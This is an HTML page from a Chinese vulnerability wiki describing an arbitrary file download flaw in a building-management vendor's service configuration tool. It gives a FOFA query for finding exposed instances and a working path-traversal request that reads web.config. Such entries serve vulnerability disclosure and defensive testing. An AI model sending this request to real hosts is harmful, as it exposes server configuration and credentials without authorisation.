@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%BE%BD%E7%94%9F%E5%91%BD%E6%B8%AF%E6%B9%BE%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E5%AE%89%E5%BE%BD%E7%94%9F%E5%91%BD%E6%B8%AF%E6%B9%BE%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>安徽生命港湾信息技术有限公司服务配置工具存在任意文件下载漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5b89\u5fbd\u751f\u547d\u6e2f\u6e7e\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8\u670d\u52a1\u914d\u7f6e\u5de5\u5177\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_2", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_3", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_4", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_5", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安恒明御安全网关远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AE%89%E5%A4%A9/%E5%AE%89%E5%A4%A9%20%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AE%89%E5%A4%A9/%E5%AE%89%E5%A4%A9%20%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安天 高级可持续威胁安全检测系统 越权访问漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">安徽生命港湾信息技术有限公司服务配置工具存在任意文件下载漏洞<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h1 id="_2">一、漏洞简介<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>安徽生命港湾信息技术有限公司，成立于2020年7月。以“产品+解决方案+服务”引领技术、运营模式创新，是以楼宇自控产品（BA)、软件平台(IBMS)、数字建筑、物联网系统(AIoT)为核心技术驱动的创新型技术企业，致力于智慧建筑、物联网系统产品研发、制造，产品涵盖IBMS平台软件、边缘计算网关、物联网数据中台、楼宇自控设备、执行器、传感器等。凭借技术团队多年的行业耕耘及深入场景的产品设计和创新，以IBMS为可视化运维管理平台，将物联网数据采集、大数据与IBMS融合，实现安防、医疗、楼宇自控、能源、园区、环境、城市、应急等智慧控制管理功能，为医院、园区、教育、政务、轨道交通等行业提供智慧建筑全生态解决方案。安徽生命港湾信息技术有限公司服务配置工具存在任意文件下载漏洞</p>
+<h1 id="_3">二、影响版本<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>服务配置工具</li>
+</ul>
+<h1 id="_4">三、资产测绘<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa：<code>body="css/markdown.css" &amp;&amp; body="icon-512.png"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1733591983248-8301dd73-b583-47cd-aacc-864c5214c282.png" src="./img/PNMBjNOeHcnDPE9f/1733591983248-8301dd73-b583-47cd-aacc-864c5214c282-414402.png" /></p>
+<h1 id="_5">四、漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">File</span><span class="o">/</span><span class="n">Download</span><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="n">web</span><span class="p">.</span><span class="na">config</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mf">10.15</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mf">133.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">133.0</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<p><img alt="1733592027293-51775f39-1fc6-48dc-8b13-194bf5dba413.png" src="./img/PNMBjNOeHcnDPE9f/1733592027293-51775f39-1fc6-48dc-8b13-194bf5dba413-711997.png" /></p>
+<blockquote>
+<p>更新: 2024-12-20 14:53:54<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/zd3swwh4v3saweol">https://www.yuque.com/xiaokp7/ocvun2/zd3swwh4v3saweol</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安恒明御安全网关远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AE%89%E5%A4%A9/%E5%AE%89%E5%A4%A9%20%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AE%89%E5%A4%A9/%E5%AE%89%E5%A4%A9%20%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安天 高级可持续威胁安全检测系统 越权访问漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
